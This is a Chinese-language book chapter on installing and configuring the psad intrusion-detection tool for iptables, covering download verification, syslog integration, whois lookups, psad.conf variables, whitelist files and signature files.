良好的网络安全始于配置正确的防火墙，防火墙的权限仅在允许基本网络连接和服务的绝对必要范围内开放。防火墙是串联设备，因此非常适合对网络流量应用过滤逻辑。在计算机网络上下文中，串联设备是指位于数据包通过网络路由时其直接路径上的任何硬件。如果串联设备内部发生硬件或软件故障并影响了其转发网络流量的能力，网络通信将停止。串联设备的示例包括路由器、交换机、桥器、防火墙和网络入侵防御系统（IPS）。

随着防火墙变得越来越全功能且复杂，它们逐渐提供了传统上属于入侵检测系统范畴的能力（例如应用层检查）。通过将这些功能与过滤流量的能力相结合，防火墙可以提供价值的入侵检测数据，从而为保护服务免受完全破坏和复杂的侦查尝试提供有效机制，并限制蠕虫流量的潜在损害。像 `iptables` 这样提供大量日志和过滤功能的防火墙可以提供不应忽视的重要安全数据。

虽然像 `Snort` 这样的专用入侵检测系统提供了大量的功能集和描述网络攻击的全面规则语言，但 `iptables` 始终处于网络流量的串联位置，并提供详细的包头日志（可以与应用层测试结合，正如我们在 第 9 章 中将看到的）。深度防御原则同样适用，因此听听 `iptables` 的故事是一个好主意。

尽管网络入侵检测系统（IDS）由串联设备（如交换机）提供网络流量，但如果 IDS 关闭，网络通信不受影响。这是因为 IDS 仅获得每个包的副本进行检查，而不需要将数据包转发到其目标地。

## psad 特性

在目前的版本中，`psad` 可以检测各种类型的可疑流量，例如由 `Nmap` 等工具生成的端口扫描（参见 [`www.insecure.org`](http://www.insecure.org)）、对各种后门程序的探测、分布式拒绝服务（DDoS）工具以及滥用网络协议的尝试。当结合 `fwsnort` 使用（参见 第 9 章,第 10 章 和 第 11 章 时，`psad` 可以检测超过 60% 的 `Snort`-2.3.3 规则并生成告警，包括需要检查应用层数据的规则。

`psad` 更有趣的特性之一是它可以被动识别产生扫描或其他恶意流量的远程操作系统。例如，如果有人从 Windows 机器启动 TCP `connect()` 扫描，`psad`（通常）可以判断扫描来自 Windows XP、2000 还是 NT 机器；在某些情况下，它甚至可以检测远程系统的补丁版本。`psad` 使用的指纹源自 `p0f`。（参见 第 7 章 关于 `p0f` 和被动操作系统指纹的讨论。）此外，`psad` 还提供了详细的电子邮件和日志告警、根据危险阈值自动拦截 IP（此功能默认禁用）、集成的谁 is 支持、DShield 报告（参见 [`www.dshield.org`](http://www.dshield.org)）以及更多功能。

我们将在接下来两个章节中涵盖所有这些功能，但现在我们将集中在 `psad` 的安装和配置上。

## psad 安装





在安装 `psad` 之前，你需要从 [`www.cipherdyne.org/psad/download`](http://www.cipherdyne.org/psad/download) 下载最新版本。在 [`www.cipherdyne.org`](http://www.cipherdyne.org) 发布的所有程序（包括 `psad`）在其各自源码树中都包含一个安装程序 `install.pl`。一旦下载了压缩包（tarball），验证 `MD5` 校验和和 `GnuPG` 签名是一个好主意.^¹ 你可以在 [`www.cipherdyne.org/public_key`](http://www.cipherdyne.org/public_key) 找到我的 `GnuPG` 公钥。以下是针对 2.0.8 版本执行这些步骤的方法：

```
 $ cd /usr/local/src
$ wget http://www.cipherdyne.org/psad/download/psad-2.0.8.tar.bz2
$ wget http://www.cipherdyne.org/psad/download/psad-2.0.8.tar.bz2.md5
$ wget http://www.cipherdyne.org/psad/download/psad-2.0.8.tar.bz2.asc
$ md5sum -c psad-2.0.8.tar.bz2.md5
psad-2.0.8.tar.bz2: OK

$ gpg --verify psad-2.0.8.tar.bz2.asc
gpg: Signature made Sun Jul 29 13:18:58 2007 EDT using DSA key A742839
gpg: Good signature from "Michael Rash <mbr@cipherdyne.org>"
gpg: aka "Michael Rash <mbr@cipherdyne.com>"
$ tar xfj psad-2.0.8.tar.bz2
$ su -
Password:
## cd /usr/local/src/psad-2.0.8
# ./install.pl
```

`install.pl` 脚本将提示你输入若干信息：发送警报的电子邮件地址、系统中运行的 syslog 进程类型（`syslogd`、`syslog-ng` 或 `metalog`）、是否让 `psad` 只分析包含特定前缀的 `iptables` 日志，以及是否将日志数据发送分布式 IDS。你可以手动输入或使用默认值（直接按回车），即可获得一个运行良好的 `psad` 安装。

你也可以根据 Red Hat 发行版作为 `RPM` 包安装 `psad`，为 Debian 系统作为 `Debian` 包安装，或为 Gentoo 系统通过 `Portage` 树安装。如果你希望保持软件安装方法一致，使用这些安装方法之一可能更好。

### 注意

由于 `psad` 强依赖于 `iptables` 防火墙，它尚未移植到 Linux 以外的操作系统。但是，如果你打算使用 `psad` 的任何活动响应功能，可以将其部署在运行不同操作系统并接收来自 Linux 系统 `iptables` 日志的 syslog 服务器上。

在 Linux 上成功安装 `psad` 将本地文件系统中创建若干新文件和目录。

Perl 是开发主 `psad` 进程使用的编程语言（辅助进程 `kmsgsd` 和 `psadwatchd` 后文将讨论是用 C 语言编写的），并且使用了若干核心 Perl 集中未包含的模块。通过在 `/usr/lib/psad` 中安装这些模块，`psad` 可以保持系统中已安装的 Perl 库（通常位于 `/usr/lib/perl`）与 `psad` 所需模块之间的严格分离。

这些模块是：

* `Date::Calc`
* `Net::IPv4Addr`
* `Unix::Syslog`
* `IPTables::Parse`
* `IPTables::ChainMgr`

三个系统进程组成 `psad`：`psad`、`msgsd` 和 `psadwatchd`。所有这些进程都安装在 `/usr/sbin` 中，并引用 `/etc/psad` 内的 `psad.conf` 文件。

`psad` 安装程序还会创建 `/etc/psad/archive` 目录并将现有的 `psad` 进程配置文件复制到那里，以便在重新安装 `psad` 时保留旧的配置。`install.pl` 程序还可以将现有的 `psad` 配置值合并到新的配置文件，这有助于尽可能地减少升级的麻烦。

安装程序还在 `/var` 中创建了若干文件和目录：在 `/var/lib/psad/psadfifo` 创建了一个命名管道³，创建了 `/var/log/psad` 目录以及 `/var/log/psad/fwdata` 文件，最后，`install.pl` 脚本在 `/var/log/psad/install.log` 保留安装日志。当 `psad` 运行时，其主操作目录（跟踪与疑流量相关的 IP 地址）是 `/var/log/psad`。

### 注意

`psad` 安装所在的目录并不是随机选择的——它们被放置在《文件系统层次结构》（FHS）定义的标准目录下。该文档规定了 Unix 文件系统目录结构中每个目录应该具有的目的。任何符合此文档的应用程序都能预测地使用 Linux 目录结构，有助于在目录文件森林中维持某种秩序。FHS 可以在 [`www.pathname.com/fhs`](http://www.pathname.com/fhs) 找到。

* * *

¹ 从安全角度来看，验证 `GnuPG` 签名更为重要，因为如果没有我的私钥，在密码学上很难伪造，而任何可以修改 `psad` 压缩包的人理论上也可以修改包含 `MD5` 校验和的文件。供参考，我的公钥指纹为 `53EA 13EA 472E 3771 894F AC69 95D8 5D6B A742 839F`，你可以在密钥导入你的 GnuPG 密钥环后验证此指纹。

² Daniel Gubser 创建了 `psad` Debian 包并在 [`www.gutreu.ch/debian`](http://www.gutreu.ch/debian) 提供。

³ 命名管道是一种特殊类型的文件，允许两个进程进行通信。其机制类似于使用管道符（`|`）将一个进程的标准连接到另一个进程的标准输入（例如，`cat /etc/hosts |grep localhost`），但命名管道持久地存在于文件系统中。

## psad 管理

一旦安装了 `psad`，就是时候启动它了。本节提供了基本 psad 管理的概述，并向你展示 `psad` 如何从 `iptables` 获取日志数据。攻击检测和被动操作系统指纹识别等运行时活动将在接下来的章节中讨论。

## 启动和停止 psad

随 `psad` 的初始化脚本适用于 Red Hat、Fedora、Slackware、Debian、Mandra 和 Gentoo Linux 系统。与许多系统进程（如 `syslog` 和 `Apache`）一样，`psad` 通常通过脚本启动和停止：

```
 # /etc/init.d/psad start
 * Starting psad ... [ ok ]
# /etc/init.d/psad stop
 * Stopping psadwatchd ... [ ok ]
* Stopping kmsgsd ... [ ok ]
* Stopping psad ... [ ok ]
```





当 `psad` 启动时，三个 `psad` 守护进程中的每一个都会将其自己的进程 ID (PID) 写入到 `/var/run/psad` 内的文件中。如果从命令行手动启动了任何守护进程，它首先会检查是否有另一个实例正在运行；如果是，则新实例将立即退出。这确保了任何现有的 `psad` 进程不受干扰。

## iptables 策略配置

从根本上说，`psad` 是一个日志分析器。它假设部署 `psad` 的系统上的 `iptables` 策略被配置为“记录日志并丢弃”（log-and-drop）的立场。这确保了 `iptables` 仅接受网络运行**绝对必需**的数据包；所有其他数据包都会被记录日志并丢弃。端口扫描、对后门程序的探测、破坏性应用命令（我们将在第 9 章）中看到，`iptables` 可以对应用层数据进行过滤）以及其他恶性杂项都在接受的网络流量列表之外，因此，源自此类策略的 `iptables` 日志通常可以为专门的入侵检测系统提供价值的补充。

`psad` 提供了一种自动化机制，用于验证本地 `iptables` 策略是否在 `INPUT` 和 `FORWARD` 链中都配置了默认的 `LOG` 和 `DROP` 规则。该机制位于 `/usr/sbin/fwcheck_psad` 的专用脚本，由 `psad` 在启动时执行（除非给出 `--no-fwcheck` 命令行开关或 `psad` 运行在独立的 syslog 服务器上）。`fwcheck_psad` 脚本使用 `IPTables::Parse` Perl 模块来获取本地 `iptables` 策略的表示，并对其进行解释以查看其是否包含 `LOG` 和 `DROP` 规则。如果不包含，`psad` 将发送配置告警邮件，通知你 `iptables` 策略配置不当。

## 使用 kill() 监控进程

将 PID 写入磁盘策略是系统守护进程的标准做法，从 `syslog` 到 `OpenSSH` 一切都使用这种方法。一旦文件系统中有了 PID 文件，就有一种优雅的解决方案，进程可以检查是否有另一个该进程的实例正在运行，而无需解析 `ps` 输出或在 `/proc` 伪文件系统中搜寻。该解决方案涉及 `kill()` 系统调用的返回值，但我们不是向我们想要检查的进程发送 `SIGTERM`、`SIGHUP`或其他标准信号，而是发送 `SIG_0`。这会指示 `kill()`：如果进程当前运行（即如果它在进程表中有条目），则返回零；如果进程未运行或遇到错误条件，则返回非零值。为了说明如何使用此方法检查本地系统上 `psad` 守护进程是否运行，我们可以使用以下命令：

```
 # kill 0, 'cat /var/run/psad/psad.pid'
# echo $?
0
```

由于返回了 0，我们知道 `psad` 当前正在系统上运行。

要查看 `kill()` 系统调用实际上是如何被使用的以及它返回什么，请使用 `strace` 实用程序。注意最后一行的 `= 0` 是 `kill()` 的返回值。

```
 #  strace kill −0 'cat /var/run/psad/psad.pid' 2>&1 |grep kill
execve("/bin/kill", ["kill", "−0", "7940"], [/* 43 vars */]) = 0
kill(7940, SIG_0)                                         = 0
```

最后，任何成熟的编程语言都提供了 `kill()` 系统调用的接口，在这里，我将说明如何使用 Perl 来检测 `psad` 当前是否正在运行。（程序化使用 `kill()` 系统调用的方法源于下方加粗的行代码。）

```
 #  cat pid.pl
#!/usr/bin/perl -w
open PIDFILE, "< /var/run/psad/psad.pid" or die $!;
while (<PIDFILE>) {
    if (/(\d+)/) {
        print "psad pid: $1 is running...\n" if kill(0, $1);
    }
}
close PIDFILE;
## ./pid.pl
psad pid: 7940 is running...
```

例如，如果当前没有实例化 `iptables` 规则，`fwcheck_psad` 将生成如下这样的邮件（系统主机名为为 `iptablesfw`）：

```
 [-] You may just need to add a default logging rule to the INPUT chain on iptablesfw.
有关更多信息，请查阅 psad 源码目录中的 "FW_HELP" 文件或访问：
    http://www.cipherdyne.org/psad/fw_config.html
[-] You may just need to add a default logging rule to the FORWARD chain on iptablesfw
. For 更多信息，请查阅 psad 源码目录中的 "FW_HELP" 文件或访问：
    http://www.cipherdyne.org/psad/fw_config.html
```

### 注意

由于 `iptables` 策略可能非常复杂，`IPTables::Parse` 模块的解析能力并不足以判断策略是否具有“记录日志并丢弃”的立场。即使检查失败，`psad` 可能仍然能够运行；其有效性取决于 `iptables` 记录的数据包类型。事实上，某些协议（例如 `SMB`，用于 Windows）产生日志过于频繁，以至于在命中 `iptables` 规则之前就已经被接受或丢弃了。如果你正在运行 `iptables`，可以在 psad 中将 `ENABLE_FW_CHECK` 变量设置为 `N`。

## syslog 配置

在充分理解 `psad` 对 `iptables` 提出的要求后，我们现在转向 `psad` 用于获取 syslog 消息的机制。当数据包被 `iptables` 中的 `LOG` 匹配时，内核通过 `klog` 报告此类。生成的内核消息通常传递给 `syslog`，以便报告到文件、命名管道，甚至通过 Berkeley 套接字到独立的系统。`syslogd` 和 `syslog-ng` 守护进程都与 `psad` 兼容，`psad` 也支持命名管道。当 `kmsgsd` 通过 `psadfifo` 接收 syslog 消息时，它检查消息是否包含两个字符串（`IN=` 和 `OUT=`），以确保该消息是由 `iptables` 生成的。如果消息通过测试，`kmsgsd` 将其附加到文件 `/var/log/fwdata`，以便供 `psad` 查看。毕竟，许多 `kern.info` syslog 消息是由与 `iptables` 无关的内核产生的；`kmsgsd` 确保只有 `iptables` 消息随后会被 `psad` 分析。

### 注意

`IN=` 和 `OUT=` 字符串表示与通过 `iptables` `LOG` 目标记录相关的输入和输出接口。这些字符串始终包含在 `iptables` 日文中。

### syslogd

如果 `psad` 运行在安装了 `syslogd` 的系统上，以下行将在安装时添加到 `/etc/syslog.conf` 配置中；它配置 `syslogd` 将 `kern.info` 消息写入 `/var/lib/psad/psadfifo`：

```
 kern.info               |/var/lib/psad/psadfifo
```

### syslog-ng

另一方面，如果 `syslog-ng` 是本地系统的 syslog 守护进程，则以下行将在安装时添加到 `/etc/syslog-ng/syslog-ng.conf` 配置文件中。（执行了检查以确保日志源 `psadsrc` 在 `syslog-ng.conf` 文件中已定义并指向 `/proc/kmsg`。）

```
 source psadsrc { unix-stream("/dev/log"); internal(); pipe("/proc/kmsg"); };
 filter f_psad { facility(kern) and match("IN=") and match("OUT="); };
 destination psadpipe { pipe("/var/lib/psad/psadfifo"); };
 log { source(psadsrc); filter(f_psad); destination(psadpipe); };
```

## whois 





一个由 Marco d'Itri 编写的优秀 whois 客户端包含在 psad 源码中。该客户端几乎总是为给定的 IP 地址查询正确的网络网块（netblock），psad 利用该客户端查询 IP 地址的所有权信息，并将其包含在电子邮件警报中（除非指定了 `--no-whois` 命令行开关）。拥有此类信息可以简化识别检测到扫描或其他攻击的源网络管理员的过程。例如，IP 地址 `219.146.161.10` 一直是我其中一个系统的持续扫描器。通过使用 psad 附带的 whois 客户端（安装在 `/usr/bin/whois_psad`，以防覆盖系统上现有的 whois 客户端），我们得到了以下结果：

```
 $ /usr/bin/whois_psad 219.146.161.10
% [whois.apnic.net node-2]
% whois data copyright terms    http://www.apnic.net/db/dbcopyright.html

inetnum:      219.146.0.0 - 219.147.31.255
netname:      CHINATELECOM-sd
descr:        CHINANET shandong province network
descr:        China Telecom
descr:        No.31,jingrong street
descr:        Beijing 100032
country:      CN
admin-c:      CH93-AP
tech-c:       WG1-AP
mnt-by:       MAINT-CHINANET
mnt-lower:    MAINT-CHINATELECOM-sd
changed:      hostmaster@ns.chinanet.cn.net 20030820
status:       ALLOCATED NON-PORTABLE
source:       APNIC

person:       Chinanet Hostmaster
nic-hdl:      CH93-AP
e-mail:       anti-spam@ns.chinanet.cn.net
address:      No.31 ,jingrong street,beijing
address:      100032
phone:        +86-10-58501724
fax-no:       +86-10-58501724
country:      CN
changed:      lqing@chinatelecom.com.cn 20051212
mnt-by:       MAINT-CHINANET
source:       APNIC
```

从此输出中可以看出，IP 地址 `219.146.161.10` 是一个从 IP 地址 `219.146.0.0` 到 `219.147.31.255` 的大型网络的一部分，该网络由名为中国电信（China Telecom）的组织控制。使用 whois 输出联系该网络的管理员在捕获攻击者方面可能是无效的，因为网络包含了超过 70,000 个 IP 地址——其中任何一个都可能与真实的系统关联。然而，准确的 whois 输出提供了价值信息，至少使这一步变得可行。

# psad 配置

所有 psad 守护进程都引用 `/etc/psad` 内的 `psad.conf` 文件，该文件遵循简单的约定：注释行以哈希标记（##）开头，配置参数以键值对格式指定。例如，`psad.conf` 中的 `HOSTNAME` 变量定义了部署 psad 的系统的主机名：

```
 ### System hostname
HOSTNAME                psad.cipherdyne.org;
```

配置变量的每个值必须以分号结束，以表示值字符串的结束。这允许在分号后的同一行中包含注释以辅助文档，如下例所示：

```
 WHOIS_TIMEOUT               60;  ### seconds
```

最后，psad 变量值可能包含子变量，这些子变量会在 psad 解析其配置时被展开。例如，psad 使用的主日志目录由 `PSAD_DIR` 变量定义，默认设置为 `/var/log/psad`。其他配置变量可以如下所示引用 `PSAD_DIR` 变量：

```
 STATUS_OUTPUT_FILE          $PSAD_DIR/status.out;
```

## /etc/psad/psad.conf

`psad.conf` 文件是 psad 的主配置文件。它包含多于 100 个配置变量，用于控制 psad 操作的各个方面。在本节中，我们将讨论一些重要的配置变量以及它们重要的原因。

### 注意

此处未涵盖次要的配置变量，但详细文档可以在 [`www.cipherdyne.org/psad/docs/index.html`](http://www.cipherdyne.org/psad/docs/index.html) 获取。

### EMAIL_ADDRESSES

`EMAIL_ADDRESSES` 变量定义了 psad 发送扫描警报、信息消息和其他通知的电子邮件地址。支持逗号分隔列表的多个电子邮件地址：

```
 EMAIL_ADDRESSES                 root@localhost, you@domain.com;
```

### DANGER_LEVEL{n}

psad 为所有恶意活动关联一个危险等级，以便对警报进行优先级排序。危险等级范围从一到五（五为最差），并分配给每个检测到攻击或扫描的 IP 地址。危险等级值的分配基于三个因素：扫描的特征（数据包数量、端口范围和时间）、检测到攻击或扫描的 IP 地址，以及 `psad.conf` 文件中定义的危险等级：

```
 DANGER_LEVEL1               5;
 DANGER_LEVEL2               15;
 DANGER_LEVEL3               150;
 DANGER_LEVEL4               1500;
 DANGER_LEVEL5               10000;
```

### HOME_NET

由于 psad 使用修改后的 Snort 规则检测可疑流量，`psad.conf` 文件中的 `HOME_NET` 变量定义了部署 psad 的本地网络。然而，psad 处理 `HOME_NET` 变量的方式与 Snort 有何不同——可以通过将 `ENABLE_INTF_LOCAL_NETS` 设置为 `N` 来覆盖这种行为。在这种情况下，你可以定义家庭网络：

```
 HOME_NET                    71.157.X.X/24, 192.168.10.0/24;
```

### EXTERNAL_NET

`EXTERNAL_NET` 变量定义了外部网络。默认值为任意，但可以设置为任意网络列表，类似于 `HOME_NET` 变量。对于大多数设置，默认可能是最好的：

```
 EXTERNAL_NET                any;
```

### SYSLOG_DAEMON

`SYSLOG_DAEMON` 变量告诉 psad 系统上运行哪个 syslog 守护进程。该变量的可能值为 `syslogd`、`syslog-ng`、`ulogd` 和 `metalog`。这允许 psad 验证相应的 syslog 配置是否正确设置，以便信息写入 `/var/lib/psad/psadfifo` 命名管道，有一个例外：如果 psad 配置为通过 `ulogd` 获取 iptables 日志，则不需要运行 syslog 守护进程，因为消息直接写入磁盘。在这种情况下甚至不会启动 `msgsd` 守护进程。

psad 大部分时间处于睡眠状态；它只会醒来查看 `/var/log/psad/fwdata` 文件是否出现了新的 iptables 日志。连续检查之间的时间间隔由 `CHECK_INTERVAL` 变量以秒为单位定义；默认五秒。该间隔可以低至一秒，但除非你想尽快生成警报，否则通常没有这样做。





端口扫描检测软件通常必须设置两个阈值来捕获端口扫描：探测的端口数量和时间间隔。攻击者可以尝试通过减少扫描的端口数量或减慢扫描速度来规避这些阈值。`ENABLE_PERSISTENCE` 变量指示 psad 不要将 `SCAN_TIMEOUT` 变量作为扫描检测的因素。这对于阻止扫描器试图通过在数天或几周内缓慢扫描目标系统，来规避超时阈值的尝试非常有用。只要扫描涉及的数据包数量至少达到 `DANGER_LEVEL1` 变量定义的数量（无论发送这些数量的数据包花费了多长时间），psad 就会发送警报。

### PORT_RANGE_SCAN_THRESHOLD

此变量允许你定义一个最小端口范围，在 psad 为端口扫描分配危险级别之前，必须扫描该范围内的端口。默认情况下，`PORT_RANGE_SCAN_THRESHOLD` 设置为一，这意味着在达到 1 级危险之前，必须至少扫描两个不同的端口。换句话说，一个 IP 地址可以反复扫描单个端口，而 psad 永远不会警报。（对于任何未分配至少 1 级危险的活动，都不会发送警报，并且可以配置 psad 直到达到一到五之间的最小危险级别才发送警报；参见下文“EMAIL_ALERT_DANGER_LEVEL”）如果你不想让 psad 完全考虑扫描端口的范围，可以将 `PORT_RANGE_SCAN_THRESHOLD` 设置为零。

### EMAIL_ALERT_DANGER_LEVEL

此变量允许你设置危险级别值的最小值，使得 IP 地址被分配的危险级别至少等于此值，否则 psad 将不会发送任何电子邮件警报。默认设置为一。

### MIN_DANGER_LEVEL

`MIN_DANGER_LEVEL` 阈值作为 psad 执行的所有警报和跟踪函数的全局阈值。例如，如果 `MIN_DANGER_LEVEL` 设置为二，那么在达到 2 级危险级别之前，psad 甚至不会将 IP 地址写入 `/var/log/psad/*ip*` 目录。因此，`MIN_DANGER_LEVEL` 变量的值应始终小于或等于上述 `EMAIL_ALERT_DANGER_LEVEL` 变量的值。默认的 `MIN_DANGER_LEVEL` 为一。

### SHOW_ALL_SIGNATURES

此变量控制 psad 是否在每个警报中包含与 IP 地址相关的所有签名警报信息（请参见第 7 章 psad 警报中包含签名信息的示例）。它默认禁用，因为如果某个特定的 IP 地址在长时间内向你的网站发送可疑流量，可能会导致 psad 发送大量的电子邮件警报。然而，即使禁用了 `SHOW_ALL_SIGNATURES`，psad 电子邮件警报也会包含在上一个 `CHECK_INTERVAL` 内触发的所有新签名。

### ALERT_ALL

当设置为 `Y` 时，此变量指示 psad 只要从某个 IP 地址看到新的恶意活动且达到 1 级危险水平，就会生成电子邮件和/或 syslog 警报。如果设置为 `N`，psad 仅在与 IP 地址关联的危险级别增加时才生成警报。

### SNORT_SID_STR

此变量定义了一个子字符串，用于与 iptables 日志消息匹配，以查看任何消息是否由完全刻画了 Snort 规则的 iptables 规则生成。此类 iptables 规则由 fwsnort 生成（参见第 9 章 和 第 10 章），它们通常包含日志标记 `SID{n}`，其中 `{n}` 是从原始 Snort 规则派生的 Snort ID 号。`SNORT_SID_STR` 的默认值为 `SID`。

### ENABLE_AUTO_IDS

如果 `Y`，此变量将 psad 从一个被动监控守护进程转换为一个主动响应攻击的程序，通过动态重新配置本地 iptables 策略，阻止攻击 IP 地址与本地系统（通过 `INPUT` 和 `OUTPUT` 链）以及所有可能受本地系统保护的系统（通过 `FORWARD` 链）进行交互。第 8 章 讨论了该功能的影响，以及如何有效地使用它。这里没有讨论几个自动响应变量，但这些变量可以在第 8 章 中找到。

### IMPORT_OLD_SCANS

psad 收集的端口扫描和其他可疑活动的信息写入 `/var/log/psad` 目录。对于每个达到 1 级危险的 IP 地址，都会创建一个新目录 `/var/log/psad/*ip*`。存储在该目录中的各种文件包括最新的电子邮件警报、whois 输出、签名匹配、危险级别数据包计数器。在启动时，psad 通常会删除任何现有 `/var/log/psad/*ip*` 目录，但你可以通过将 `IMPORT_OLD_SCANS` 设置为 `Y` 让 psad 导入这些旧目录的所有数据。此功能允许你在不丢失扫描数据的情况下重启 psad。

### ENABLE_DSHIELD_ALERTS

将此变量设置为 `Y` 以允许 psad 向 DShield 发送扫描。由于扫描信息可能是敏感的，你应该意识到当你将扫描数据传递给 DShield 时，它不再受你的控制并解析到一个相对开放的数据库。然而，DShield 允许人们更好地了解例如受攻击的服务，甚至是哪个 IP 地址正在进行攻击（这使得该 IP 地址成为严厉防火墙规则的理想候选者）。我强烈建议在 psad 中启用此功能，除非有严格要求（例如站点安全策略）不向 DShield 通信扫描信息；启用此功能的人越多，互联网对大家越安全。

### IGNORE_PORTS

许多入侵检测系统的关键功能是可以过滤管理员希望 IDS 完全忽略的某些数据。`IGNORE_PORTS` 变量指示 psad 根据目标端口和关联协议（TCP 或 UDP）忽略 iptables 日志。支持如下端口范围和多个端口协议组合：

```
IGNORE_PORTS udp/53, udp/5000, tcp/51000-61356;
```

与其使用 `IGNORE_PORTS` 变量，你可以调整 iptables 策略，使得要忽略的端口在命中 `LOG` 规则之前被匹配。

### IGNORE_PROTOCOLS

通过 `IGNORE_PROTOCOLS` 变量，psad 可以被指示忽略整个协议。通常最好调整 iptables 策略不记录你想忽略的协议，但如果你想让 psad 忽略所有 ICMP 数据包（例如），可以这样设置 `IGNORE_PROTOCOLS`：

```
IGNORE_PROTOCOLS icmp;
```

### IGNORE_LOG_PREFIXES

你会发现 iptables 策略非常复杂，包含许多不同的日志规则——每个规则可能都有自己的日志前缀。如果你想让 psad 忽略特定的日志前缀（例如 `DROP:INPUT5:eth1`），可以这样设置 `IGNORE_LOG_PREFIXES`：

```
IGNORE_LOG_PREFIXES DROP:INPUT5:eth1;
```

### EMAIL_LIMIT





在某些情况下，`iptables` 策略被配置为记录某些并非恶意的流量，这些流量可能会在网络中反复出现（例如，向特定 DNS 服务器的 DNS 请求）。如果 `psad` 将此类流量解释为扫描，那么 `psad` 可能会因为流量重复出现而发送大量的电子邮件告报。你可以使用 `EMAIL_LIMIT` 变量强制 `psad` 对针对任何扫描 IP 地址发送的电子邮件告报数量设置限制。默认值为 0，意味着不进行任何限制，但如果你将其设置为 50，则 `psad` 对给定的 IP 地址发送的电子邮件告报将不超过 50 条：

```
EMAIL_LIMIT                 50;
```

## ALERTING_METHODS

大多数管理员同时使用 `psad` 提供的电子邮件和 syslog 报告模式，但 `ALERTING_METHODS` 变量允许你控制 `psad` 是否生成电子邮件或 syslog 告报。`ALERTING_METHODS` 变量接受三个值：`noemail`、`nosyslog` 和 `ALL`。`noemail` 和 `nosyslog` 值指示 `psad` 不发送电子邮件或 syslog 告报；这些值可以组合以禁用所有告报。默认是同时生成电子邮件和 syslog 告报：

```
ALERTING_METHODS           ALL;
```

## FW_MSG_SEARCH

`FW_MSG_SEARCH` 变量定义了 `psad` 如何搜索 `iptables` 日志消息。要限制 `psad` 仅分析包含特定日志前缀的日志消息（在 `iptables` 的 `LOG` 规则中使用 `--log-prefix` 参数定义），请使用 `FW_MSG_SEARCH` 变量定义该前缀。这允许 `iptables` 配置为给数据包分配其他日志前缀，而不让 `psad` 分析它们。

例如，为了让 `psad` 仅分析包含字符串 `DROP` 的 `iptables` 日志消息，可以如下所示配置 `FW_MSG_SEARCH` 变量：

```
FW_MSG_SEARCH                 DROP;
```

## /etc/psad/auto_dl

与任何 IDS（入侵检测系统）一样，总是存在较高的误报概率。因此，每个 IDS 都应该配备白名单功能，通过该功能，某些系统、网络、端口或协议可以从任何检测机制和（最重要的是）任何自动化响应功能中排除。由于某些 IP 地址或网络可能是已知的恶意行为者，还应该有一个将其加入黑名单的规定。

这些要求在 `psad` 的 `auto_dl` 文件中满足，其遵循以下语法：

```
ip/network     danger level     optional protocol/optional ports
```

如果危险级别设置为 0，`psad` 将完全忽略该 IP 地址或网络。然而，如果某个 IP 地址或网络已知是极恶意的，危险级别可以设置为最高五。

例如，以下两行中的第一行确保 `psad` 将忽略所有来自 IP 地址 `192.168.10.3` 的流量；第二行则立即将来自 `10.10.1.0/24` 网络的所有 TCP  22 (SSH) 流量的危险级别提升至五：

```
192.168.10.3     0;
10.10.1.0/24     5     tcp/22;
```

## /etc/psad/signatures

`/etc/psad/signatures` 文件包含一组约 200 条经过微调的 Snort 规则。这些规则代表 `psad` 能够直接从 `iptables` 日志消息检测到的攻击。这些规则中没有规则针对网络流量进行应用层测试——`fwsnort` 运行应用层测试（参见 第 9 章 和 第 10 章）。该文件的示例规则如下：

```
alert udp $EXTERNAL_NET any -> $HOME_NET 1026:1029 (msg:"MISC Windows popup spam
attempt"; classtype:misc-activity; reference:url,www.linklogger.com/UDP1026.htm;
psad_dsize:>100; psad_id:100196; psad_dl:2;)
```

上述加粗的字段是 `psad` 添加到 Snort 规则语言中的自定义字段。在这种情况下，`psad_dsize` 字段要求 UDP 包的数据部分大于 100 字节，`psad_id` 字段为此规则定义了一个唯一 ID，`psad_dl` 字段告诉 `psad` 为触发此签名的任何 IP 地址分配等级的危险级别。关于 `psad` 对 Snort 规则语言所修改的完整讨论，见 第 7 章。

## /etc/psad/snort_rule_dl

与 `/etc/psad/auto_dl` 文件类似，`snort_rule_dl` 文件指示 `psad` 自动设置触发 Snort 规则匹配的任何 IP 地址的危险级别。该文件的语法如下：

```
sid         danger level
```

如果危险级别为 0，`psad` 将完全忽略签名匹配且不发送任何告报。某些签名匹配比其他的更严重——如果 `psad` 检测到匹配 Snort 规则 1812 (`EXPLOIT gobbles SSH attempt`)，这比规则 469 更具破坏性。你可以将匹配 1812 的 IP 地址危险级别提升到 5，如下所示：

```
1812        5;
```

正如 第 2 章 中提到的，IP 头部选项部分并不经常使用，但 `iptables` 可以使用 `--log-options` 参数记录 IP 选项。如果 `iptables` 日志包含 IP 选项，`psad` 会解析这些选项以异常活动。该文件定义了常用的 IP 选项及其对应的数字，格式如下：

```
option value   length (−1 for variable)   ipopts argument   description
```

例如，这是包含 `lsrr`（松散路由）选项的方式：

```
131  −1  lsrr        Loose Source Route
```

## /etc/psad/pf.os

来自 p0f 项目的数据库被 `psad` 用于识别操作系统。该数据库由 `psad` 安装为 `/etc/psad/pf.os`，并在 `psad` 启动（或当 `psad` 通过 `kill` 命令接收到 HUP 信号时）导入。这是一个 Linux 的 p0f 指纹示例：

```
S4:64:1:60:M*,S,T,N,W0::Linux:2.4/2.6 <= 2.6.7
```

关于该主题的更多材料（包括上述 p0f 签名的分解）可以在 第 7 章。

* *

⁶ `ulogd` 是 Netfilter 项目提供的用户空间日志守护，提供了比标准 `LOG` 目标更灵活的日志选项。特别是数据包由各种 `ulogd` 插件管理，这些插件可以执行如以 pcap 格式记录到磁盘甚至写入 MySQL 数据库的操作。`ulogd` 可以从 [`www.gnumonks.org/projects`](http://www.gnumonks.org/projects) 下载。

⁷ 这需要 `fwsnort` 对 SSH 应用层数据进行字符串匹配；关于此主题的更多信息请参见 第 9 章。

# 结语





本章重点讨论了在运行 `iptables` 的 Linux 系统上安装和配置 `psad` 的方法。文中介绍了 `psad.conf` 文件中一些较为重要的配置变量，现在我们准备在下一章中深入探讨 `psad` 的操作层面。作为参考，您可以在网上 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls) 找到默认 `psad` 配置文件的完整示例。此外，在 [`www.cipherdyne.org`](http://www.cipherdyne.org) 上还有大量的额外的 `psad` 文档可供查询。

# 第 6 章 PSAD 操作：检测可疑流量

